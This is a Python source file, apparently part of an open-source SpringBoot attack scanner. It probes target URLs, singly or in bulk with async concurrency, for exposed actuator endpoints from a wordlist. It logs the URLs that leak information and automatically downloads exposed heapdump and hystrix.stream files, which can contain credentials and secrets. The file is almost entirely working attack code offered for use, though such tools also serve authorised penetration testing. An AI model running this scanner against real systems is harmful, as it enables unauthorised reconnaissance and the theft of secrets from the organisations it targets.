#!/usr/bin/env python
# coding=utf-8
   ################
  #   AabyssZG   #
 #    Fkalis    #
################
import asyncio
import hashlib
import itertools
import sys
import time
from time import sleep

import aiohttp
from termcolor import cprint
from tqdm import tqdm

from inc.common import (log_error, merge_headers, normalize_url, random_ua,
                        http_get, http_head, write_result, exit_interrupt)


def url(urllist, proxies, header_new):
    f1 = open("urlout.txt", "wb+")
    f1.close()
    cprint(f"======开始对目标URL测试SpringBoot信息泄露端点======", "cyan")
    sleeps = input("\n是否要延时扫描 (默认0秒): ")
    if sleeps == "":
        sleeps = "0"
    sleeps = int(float(sleeps))
    encountered_hashes = []
    with open("Dir.txt", 'r') as web:
        webs = web.readlines()
    for web in webs:
        web = web.strip()
        u = urllist + web
        newheader = merge_headers({"User-Agent": random_ua()}, header_new)
        try:
            r = http_get(url=u, headers=newheader, proxies=proxies)
            sleep(sleeps)
            if r.status_code == 503:
                sys.exit()
            if ((r.status_code == 200) and ('need login' not in r.text) and ('禁止访问' not in r.text) and (len(r.content) != 3318) and ('无访问权限' not in r.text) and ('认证失败' not in r.text)):
                content_hash = hashlib.md5(r.content).hexdigest()
                if content_hash not in encountered_hashes:
                    encountered_hashes.append(content_hash)
                    cprint("[+] 状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content)), "red")
                    write_result("urlout.txt", u)
                else:
                    cprint("[*] 已存在重复内容的URL:" + u, "magenta")
            elif (r.status_code == 200):
                cprint("[+] 状态码%d" % r.status_code + ' ' + "但无法获取信息 URL为:" + u + '    ' + "页面长度为:" + str(len(r.content)), "magenta")
            else:
                cprint("[-] 状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u, "yellow")
        except KeyboardInterrupt:
            exit_interrupt()
        except Exception as e:
            cprint("[-] URL为 " + u + " 的目标积极拒绝请求，予以跳过！", "magenta")
            print(e)
    count = len(open("urlout.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标URL存在SpringBoot敏感信息泄露，已经导出至 urlout.txt ，共%d行记录" % count, "red")
    else:
        print('\n')
        cprint("[-] 目标URL没有存在SpringBoot敏感信息泄露", "yellow")
    sys.exit()


def get_file(filename):
    with open(filename, 'r') as temp:
        temps = temp.readlines()
        for urls in temps:
            url = urls.strip()
            yield url


async def async_dir(url, proxies, header_new, semaphore, sleeps):
    try:
        u_list = []
        with open("Dir.txt", 'r') as web:
            web_lines = web.readlines()
            for web_line in web_lines:
                web_line = web_line.strip()
                u = normalize_url(url) + web_line
                u_list.append(u)
        tasks = [asyncio.create_task(file_semaphore(u_dir, proxies, header_new, semaphore, sleeps)) for u_dir in u_list]
        result = await asyncio.gather(*tasks, return_exceptions=True)
        exceptions = [r for r in result if isinstance(r, Exception)]
        if exceptions:
            cprint(f"[*] URL {url} 的部分端点访问失败，但继续扫描其他端点", "yellow")
    except Exception as e:
        cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
        log_error(e)


async def file(u, proxies, header_new):
    try:
        newheader = merge_headers({"User-Agent": random_ua()}, header_new)
        # 处理代理格式
        proxy_str = None
        if proxies and 'http' in proxies:
            proxy_str = proxies['http']

        async with aiohttp.ClientSession() as session:
            async with session.get(url=u, headers=newheader, proxy=proxy_str, allow_redirects=False, ssl=False, timeout=10) as r:
                conntext = await r.text()
                if ((r.status == 200) and ('need login' not in conntext) and ('禁止访问' not in conntext) and (len(conntext) != 3318) and ('无访问权限' not in conntext) and ('认证失败' not in conntext)):
                    try:
                        async with session.get(url=u + "QWEASD123", headers=newheader, proxy=proxy_str, allow_redirects=False, ssl=False, timeout=10) as r2:
                            randtext = await r2.text()
                        if len(conntext) != len(randtext):
                            cprint("[+] 状态码%d" % r.status + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(conntext)), "red")
                            write_result("output.txt", u)
                        else:
                            cprint("[-] 发现重复长度URL为: " + u + '    ' + "页面长度为:" + str(len(conntext)), "magenta")
                    except Exception:
                        cprint("[+] 状态码%d" % r.status + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(conntext)) + " (对比验证失败)", "red")
                        write_result("output.txt", u)
                elif r.status == 200:
                    cprint(
                        "[+] 状态码%d" % r.status + ' ' + "但无法获取信息 URL为:" + u + '    ' + "页面长度为:" + str(len(conntext)), "magenta")
                else:
                    cprint("[-] 状态码%d" % r.status + ' ' + "无法访问URL为:" + u, "yellow")
    except asyncio.TimeoutError:
        cprint("[-] 访问超时 URL为:" + u, "yellow")
    except Exception as e:
        cprint("[-] 访问失败 URL为:" + u + " 错误:" + str(e), "yellow")


async def file_semaphore(url, proxies, header_new, semaphore, sleeps):
    async with semaphore:
        await file(url, proxies, header_new)
        await asyncio.sleep(int(sleeps))


async def file_main(urlfile, proxies, header_new):
    f1 = open("output.txt", "wb+")
    f1.close()
    cprint("======开始读取目标TXT并测试SpringBoot信息泄露端点======", "cyan")
    time_start = time.time()
    sleeps = input("\n是否要延时扫描 (默认不延时，必须是整数): ")
    if sleeps == "":
        sleeps = "0"
    else:
        sleeps = int(sleeps)
    max_concurrency = input("请输入最大并发数 (默认10): ")
    if max_concurrency == "":
        max_concurrency = 10
    else:
        max_concurrency = int(max_concurrency)
    max_tasks = 100
    semaphore = asyncio.Semaphore(max_concurrency)
    urls_itr = get_file(urlfile)
    while True:
        try:
            urls_lists = list(itertools.islice(urls_itr, max_tasks))
            if not urls_lists:  # 当urls_itr为空时，直接跳出循环
                break
            tasks = [async_dir(url, proxies, header_new, semaphore, sleeps) for url in urls_lists]
            await asyncio.gather(*tasks, return_exceptions=True)
        except StopIteration:
            break
    count = len(open("output.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标TXT内存在SpringBoot敏感信息泄露，已经导出至 output.txt ，共%d行记录" % count, "red")
    else:
        print('\n')
        cprint("[-] 目标TXT内没有存在SpringBoot敏感信息泄露", "yellow")
    time_end = time.time()  # 记录结束时间
    time_sum = time_end - time_start  # 计算的时间差为程序的执行时间，单位为秒/s
    cprint("[+] 批量扫描共耗时 %s 秒" % time_sum, "red")
    sys.exit()


def dump(urllist, proxies, header_new):
    def download(url: str, fname: str, proxies: str, newheader):
        # 用流stream的方式获取url的数据
        resp = http_get(url, headers=newheader, proxies=proxies, stream=True)
        # 拿到文件的长度，并把total初始化为0
        total = int(resp.headers.get('content-length', 0))
        # 打开当前目录的fname文件(名字你来传入)
        # 初始化tqdm，传入总数，文件名等数据，接着就是写入，更新等操作了
        with open(fname, 'wb') as file, tqdm(
                desc=fname,
                total=total,
                unit='iB',
                unit_scale=True,
                unit_divisor=1024,
        ) as bar:
            for data in resp.iter_content(chunk_size=1024):
                size = file.write(data)
                bar.update(size)

    cprint("======开始对目标URL测试SpringBoot敏感文件泄露并下载======", "cyan")
    newheader = merge_headers({"User-Agent": random_ua()}, header_new)

    # (路径, 下载保存的文件名, 视为泄露的状态码)
    targets = [
        ("actuator/heapdump", "heapdump", (200,)),
        ("heapdump", "heapdump", (200,)),
        ("heapdump.json", "heapdump.json", (200,)),
        ("gateway/actuator/heapdump", "heapdump", (200,)),
        ("hystrix.stream", "hystrix.stream", (200, 401)),
        ("artemis-portal/artemis/heapdump", "heapdump", (200,)),
    ]
    try:
        for path, fname, ok_codes in targets:
            r = http_head(urllist + path, headers=newheader, proxies=proxies)
            if r.status_code in ok_codes:
                cprint(f"[+][+][+] 发现 /{path} 敏感文件泄露 下载端点URL为:{urllist + path}", "red")
                download(urllist + path, fname, proxies, newheader)
                sys.exit()
            else:
                cprint(f"[-] 在 /{path} 未发现敏感文件泄露", "yellow")
        sys.exit()
    except KeyboardInterrupt:
        exit_interrupt()
    except Exception as e:
        print(f"[-] 下载失败，请手动尝试下载，报错内容为 {e}")
        log_error(e)
        sys.exit()


def dumpfile(input_file, proxies, header_new):
    newheader = merge_headers({"User-Agent": random_ua()}, header_new)
    paths = ["actuator/heapdump", "heapdump", "heapdump.json", "gateway/actuator/heapdump", "hystrix.stream", "artemis-portal/artemis/heapdump"]
    with open(input_file, 'r') as web:
        urls = web.readlines()
    processed_urls = []
    for url in urls:
        processed_urls.append(normalize_url(url))
    valid_urls = []

    cprint(f"======开始读取目标TXT并扫描SpringBoot信息文件端点======", "cyan")
    sleeps = input("\n是否要延时扫描 (默认0秒): ")
    if sleeps == "":
        sleeps = "0"
    sleeps = int(float(sleeps))
    for url in processed_urls:
        for path in paths:
            full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
            try:
                r = http_head(full_url, headers=newheader, proxies=proxies)
                sleep(sleeps)
                if r.status_code == 200:
                    cprint("[+] 发现SpringBoot敏感文件泄露，地址为 " + full_url, "red")
                    valid_urls.append(full_url)
                else:
                    cprint("[-] 没有发现SpringBoot敏感文件泄露，地址 " + str(full_url) + " 状态码为 " + str(r.status_code), "yellow")
            except KeyboardInterrupt:
                exit_interrupt()
            except Exception as e:
                print(f"[-] 访问 {full_url} 出现错误，报错错误日志为 error.log")
                log_error(e)
                break

    with open("dumpout.txt", 'w') as f:
        for valid_url in valid_urls:
            f.write(valid_url + '\n')
    count = len(open("dumpout.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标TXT内存在SpringBoot敏感文件泄露，已经导出至 dumpout.txt ，共%d行记录" % count, "red")
    else:
        cprint("[-] 读取指定TXT没有存在SpringBoot敏感文件泄露", "yellow")
    sys.exit()
